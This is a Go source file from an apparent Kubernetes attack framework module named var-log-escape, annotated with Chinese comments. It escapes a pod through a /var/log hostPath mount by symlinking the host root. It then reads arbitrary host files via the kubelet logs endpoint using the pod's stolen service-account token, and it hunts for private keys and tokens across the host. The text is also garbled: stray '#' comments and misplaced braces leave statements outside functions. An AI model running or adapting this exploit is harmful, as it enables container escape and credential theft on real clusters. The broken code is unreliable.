# `kubesploit\data\modules\sourcecode\go\var-log-escape\main.go`

```go
package main

import (
    "crypto/tls"  // 导入加密通信包
    "encoding/hex"  // 导入十六进制编码包
    "fmt"  // 导入格式化包
    "io/ioutil"  // 导入读取文件包
    "log"  // 导入日志包
    "net"  // 导入网络包
    "net/http"  // 导入HTTP包
    "os"  // 导入操作系统包
    "os/exec"  // 导入执行外部命令包
    "os/user"  // 导入用户包
    "path/filepath"  // 导入文件路径包
    "regexp"  // 导入正则表达式包
    "strings"  // 导入字符串包
    "time"  // 导入时间包
)

const (
    c_PathSecrets  = "/var/run/secrets/kubernetes.io/serviceaccount/token"  // 设置常量，存储密钥路径
    c_DownloadPath = "/exploit/host-data"  // 设置常量，存储下载路径
)

var (
    g_Bearer, g_KubeletEndPoint      string  // 声明全局变量，存储身份验证信息和Kubelet终结点
    g_CountScan, g_LastStatusRespond int  // 声明全局变量，存储扫描计数和最后状态响应
    g_Client                         *http.Client  // 声明全局变量，存储HTTP客户端
)

func checkError(i_Error error) {  // 定义函数，检查错误
    if i_Error != nil {  // 如果有错误
        log.Fatal(i_Error)  // 记录错误并退出程序
    }
}

func initVariables() {  // 定义函数，初始化变量
    defaultGateTemp := getDefaultGateway()  // 调用函数获取默认网关
    g_KubeletEndPoint = defaultGateTemp  // 将默认网关赋值给Kubelet终结点

    data, err := ioutil.ReadFile(c_PathSecrets)  // 读取密钥文件内容
    checkError(err)  // 检查是否有错误

    token := string(data)  // 将读取的内容转换为字符串
    bearerTemp := "Bearer " + token  // 构建身份验证信息
    g_Bearer = bearerTemp  // 将身份验证信息赋值给全局变量

    tr := &http.Transport{  // 创建HTTP传输对象
        MaxIdleConns:       10,  // 设置最大空闲连接数
        IdleConnTimeout:    30 * time.Second,  // 设置空闲连接超时时间
        DisableCompression: true,  // 禁用压缩
        TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},  // 配置TLS客户端
    }
    g_Client = &http.Client{  // 创建HTTP客户端
        Transport: tr,  // 设置传输对象
        Timeout:   time.Second * 10,  // 设置超时时间
    }
}

func getMountPathIfExists() string {  // 定义函数，获取存在的挂载路径
    cmd := `cat /proc/self/mountinfo | grep /var/log || true`  // 构建命令，查找挂载信息
    out, err := exec.Command("sh", "-c", cmd).Output()  // 执行命令并获取输出
    checkError(err)  // 检查是否有错误

    pattern := ".*? .*? .*? (.*?) (.*?) .*?\n"  // 构建正则表达式模式
    r, err := regexp.Compile(pattern)  // 编译正则表达式
    checkError(err)  // 检查是否有错误
    match := r.FindAllStringSubmatch(string(out), -1)  // 查找所有匹配项
    for _, matchInner := range match {  // 遍历匹配项
        if matchInner[1] == "/var/log" {  // 如果找到挂载路径为/var/log
            return matchInner[2]  // 返回对应的路径
        }
    }
    return ""  // 如果未找到，返回空字符串
}

func getDefaultGateway() string {  // 定义函数，获取默认网关
    cmd := `cat  /proc/net/route`  // 构建命令，查找路由信息
    out, err := exec.Command("sh", "-c", cmd).Output()  // 执行命令并获取输出

    pattern := `\n[^[:space:]]*?[[:space:]]00000000[[:space:]](.*?)[[:space:]]`  // 构建正则表达式模式
    r, err := regexp.Compile(pattern)  // 编译正则表达式
    checkError(err)  // 检查是否有错误
    match := r.FindAllStringSubmatch(string(out), -1)  // 查找所有匹配项

    getway := match[0][1]  // 获取网关地址
    # 使用 hex 包中的 DecodeString 函数将十六进制字符串转换为字节流，忽略错误返回值
    a, _ := hex.DecodeString(getway)
    # 使用 fmt 包中的 Sprintf 函数将字节流中的数据格式化为 IP 地址格式并返回
    return fmt.Sprintf("%v.%v.%v.%v", a[3], a[2], a[1], a[0])
}

// 将内容写入扫描文件
func writeToScanFile(i_DirPath string, i_ContentToWrite string) {
    // 打开文件，如果不存在则创建，以追加模式写入
    f, err := os.OpenFile(i_DirPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
    checkError(err)
    // 延迟关闭文件
    defer f.Close()

    // 写入内容到文件
    _, err = f.WriteString(i_ContentToWrite)
    checkError(err)
}

// 读取指定路径的内容
func read(i_Path string) string {
    // 发起 HTTP GET 请求
    req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s:10250/logs/root_link%s", g_KubeletEndPoint, i_Path), nil)
    req.Header.Add("Authorization", g_Bearer)
    resp, err := g_Client.Do(req)
    checkError(err)

    // 保存响应状态码
    tempStatus := resp.StatusCode
    g_LastStatusRespond = tempStatus

    // 如果状态码不是 200 或 404，则输出错误信息
    if resp.StatusCode != 200 && resp.StatusCode != 404 {
        log.Fatalf("[!] Cannot run exploit, no permissions to access logs on the kubelet\n")
    }

    // 如果状态码是 404，则返回路径不存在的提示信息
    if resp.StatusCode == 404 {
        return fmt.Sprintf("[!] The path %s does not exists in the host\n", i_Path)
    }

    // 读取响应体内容
    body, err := ioutil.ReadAll(resp.Body)
    checkError(err)

    // 延迟关闭响应体
    defer resp.Body.Close()
    return string(body)
}

// 读取目录并过滤内容
func readDirAndFilter(i_Path string) (string, []string) {
    directoryPattern := "<a href=\"(.*)\""
    r, err := regexp.Compile(directoryPattern)
    checkError(err)

    // 读取指定路径的内容
    pathContent := read(i_Path)
    // 使用正则表达式匹配内容
    matches := r.FindAllStringSubmatch(pathContent, -1)
    pathContentFiltered := make([]string, len(matches))

    // 将匹配到的内容存入数组
    for i, match := range matches {
        pathContentFiltered[i] = match[1]
    }

    return pathContent, pathContentFiltered
}

// 创建目录并下载文件
func mkdirAndDownload(i_Path string, i_Query string, i_FileName string) {
    filePath := filepath.Join(c_DownloadPath, i_FileName)
    g_CountScan = 0
    // 如果目录不存在，则创建目录
    if _, err := os.Stat(c_DownloadPath); os.IsNotExist(err) {
        err = os.MkdirAll(c_DownloadPath, os.FileMode(0766))
        checkError(err)
        fmt.Printf("[i] created dir in: %s \n", c_DownloadPath)
    }
    // 根据查询下载文件
    downloadByQuery(i_Path, i_Query, filePath)
    fmt.Printf("[+] found %d %s in %s\n", g_CountScan, i_FileName, i_Path)
    g_CountScan = 0
}
func query(i_Query string, i_Content string, i_FullPath string) bool {
    var match bool
    // 使用 filepath.Match 函数匹配查询字符串和内容字符串
    match, err := filepath.Match(i_Query, i_Content)
    // 检查错误
    checkError(err)

    if match == false {
        return match
    }
    // 检查是否为重复的令牌
    if i_Query == "token" && match == true {
        // 定义匹配令牌的正则表达式
        pattern := `.*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+\/token`
        // 编译正则表达式
        r, err := regexp.Compile(pattern)
        // 检查错误
        checkError(err)
        // 使用正则表达式匹配文件路径
        match = !r.MatchString(i_FullPath)
    }

    return match
}

func downloadByQuery(i_Path string, i_Query string, i_FilePath string) {
    // 排除的文件夹
    excludedFolders := "proc/"
    var currPath string

    // 读取目录并过滤内容
    _, pathContentFiltered := readDirAndFilter(i_Path)
    // 遍历过滤后的目录内容
    for _, dirContent := range pathContentFiltered {

        if dirContent == excludedFolders {
            continue
        }

        currPath = filepath.Join(i_Path, dirContent)

        if strings.HasSuffix(dirContent, "/") {
            // 递归调用下载函数
            downloadByQuery(currPath, i_Query, i_FilePath)
            continue
        }
        // 调用查询函数
        match := query(i_Query, dirContent, currPath)
        if match {
            // 格式化当前路径并写入扫描文件
            currPath = fmt.Sprintf("%s\n\n", currPath)
            writeToScanFile(i_FilePath, currPath)
            g_CountScan++
        }
    }
}

func lsh(i_Path string) string {
    // 读取目录并过滤内容
    pathContent, pathContentFiltered := readDirAndFilter(i_Path)
    var allDir string

    if g_LastStatusRespond == 404 {
        return pathContent
    }

    if len(pathContentFiltered) == 0 && len(pathContent) != 0 {
        return fmt.Sprintf("[!] %s is not a directory", i_Path)
    }

    for i, match := range pathContentFiltered {
        dir := strings.TrimSuffix(match, "/")
        if i == 0 {
            allDir = dir
        } else {
            allDir = fmt.Sprintf("%s\n%s", allDir, dir)
        }
    }

    return allDir
}

func cath(i_Path string) string {
    // 读取目录并过滤内容
    pathContent, pathContentFiltered := readDirAndFilter(i_Path)

    if 1 <= len(pathContentFiltered) {
        return fmt.Sprintf("[-] %s is a directory", i_Path)
    }
}
    # 返回变量 pathContent 的值
    return pathContent
// 检查当前用户是否为root用户
func isRoot() bool {
    // 获取当前用户信息
    currentUser, err := user.Current()
    // 检查错误
    checkError(err)
    // 返回当前用户是否为root用户
    return currentUser.Username == "root"
}

// 将当前进程附加到root用户
func attachToRoot() string {
    // 获取已存在的挂载路径
    path := getMountPathIfExists()
    // 如果路径为空，则返回错误信息
    if path == "" {
        return fmt.Sprintf("[!] No root mount to /var/log exists in the pod, cant continute to the exploit\n")
    }
    // 如果当前用户是root用户
    if isRoot() {
        // 创建符号链接
        if err := os.Symlink("/", fmt.Sprintf("%s%s", path, "/root_link")); err != nil {
            // 如果符号链接已存在，则打印信息并返回空字符串
            if os.IsExist(err) {
                fmt.Println("[i] Symlink already exists , continue to the exploit")
                return ""
            }
            // 检查错误
            checkError(err)
        }
    } else {
        // 如果当前进程不是以root用户身份运行，则返回错误信息
        return fmt.Sprintf("[!] The process is not running as root, cant continute to the exploit\n")
    }
    // 打印创建符号链接成功的信息
    fmt.Println("[i] Create symlink succeeded")
    return ""
}

// 从root用户处分离当前进程
func dettachFromRoot() {
    // 检查符号链接是否存在
    if _, err := os.Lstat("/var/log/host/root_link"); err == nil {
        // 如果符号链接存在，则移除
        err := os.Remove("/var/log/host/root_link")
        checkError(err)
    } else {
        // 如果符号链接不存在，则打印信息并返回
        if os.IsNotExist(err) {
            fmt.Println("[i] Symlink is not exists, ending exploit")
            return
        }
        // 检查错误
        checkError(err)
    }
    // 打印移除符号链接成功的信息
    fmt.Printf("[i] Removed symlink succeeded\n")
}

// 打印目录消息
func dirMessage(i_FileName string) {
    fmt.Printf("[i] The result of the scan is stored in a file at %s/%s in the agent. The file includes path for each corresponded match \n You can access the file through the bash module of the agent\n", c_DownloadPath, i_FileName)
}

// 检查错误是否为超时错误
func isTimeoutError(err error) bool {
    e, ok := err.(net.Error)
    return ok && e.Timeout()
}

// 对于hostnetwork=true的情况，测试与Kubelet的连接
func testConnectionToKubelet() bool {
    // 创建HTTP请求
    req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s:10250/logs/root_link/", g_KubeletEndPoint), nil)
    req.Header.Add("Authorization", g_Bearer)
    // 发送HTTP请求
    _, err := g_Client.Do(req)
    // 如果不是超时错误，则检查错误并返回true
    if !isTimeoutError(err) {
        checkError(err)
        return true
    }
    // 返回false
}
    # 创建一个新的 HTTP 请求，使用 GET 方法请求指定 URL
    req, _ = http.NewRequest("GET", "https://0.0.0.0:10250/logs/root_link/", nil)
    # 在请求头中添加 Authorization 字段，值为全局变量 g_Bearer
    req.Header.Add("Authorization", g_Bearer)
    # 发送 HTTP 请求并获取响应，同时将错误信息保存在 err 变量中
    _, err = g_Client.Do(req)
    # 如果错误不是超时错误，则检查并处理错误
    if !isTimeoutError(err) {
        checkError(err)
        # 设置全局变量 g_KubeletEndPoint 的值为 "0.0.0.0"
        g_KubeletEndPoint = "0.0.0.0"
        # 返回 true
        return true
    }
    # 如果是超时错误，则返回 false
    return false
}


func mainfunc(i_Command string, i_Option string) {
    // 将消息附加到根目录
    msg := attachToRoot()
    // 如果消息不为空，则打印消息并返回
    if msg != "" {
        fmt.Print(msg)
        return
    }

    // 初始化变量
    initVariables()
    // 测试连接到 kubelet
    if !testConnectionToKubelet() {
        fmt.Print("[i] Can't connect to kubelet, ending exploit\n")
        return
    }

    // 根据命令执行不同的操作
    switch i_Command {
    case "lsh":
        // 打印 lsh 命令的结果
        fmt.Println(lsh(i_Option))
    case "cath":
        // 打印 cath 命令的结果
        fmt.Println(cath(i_Option))
    case "scan":
        // 根据选项执行不同的操作
        switch i_Option {
        case "key":
            // 在指定目录中创建并下载匹配 *.key 的文件，并放入 private-keys 目录
            mkdirAndDownload("/home/", "*.key", "private-keys")
            mkdirAndDownload("/etc/", "*.key", "private-keys")
            mkdirAndDownload("/var/lib/kubelet/pods/", "*.key", "private-keys")
            mkdirAndDownload("/var/lib/docker/", "*.key", "private-keys")
            mkdirAndDownload("/usr/", "*.key", "private-keys")
            // 打印 private-keys 目录的消息
            dirMessage("private-keys")
        case "token":
            // 在指定目录中创建并下载匹配 token 的文件，并放入 tokens 目录
            mkdirAndDownload("/var/lib/kubelet/pods/", "token", "tokens")
            // 打印 tokens 目录的消息
            dirMessage("tokens")
        default:
            // 打印用法信息
            usage()
        }
    default:
        // 打印用法信息
        usage()
    }

    // 从根目录分离
    dettachFromRoot()
}

// 打印用法信息
func usage() {
    fmt.Println("[i] Usage: [cath|lsh] <host_path>")
    fmt.Println("[i] Usage: [scan] [token|key]")
}
```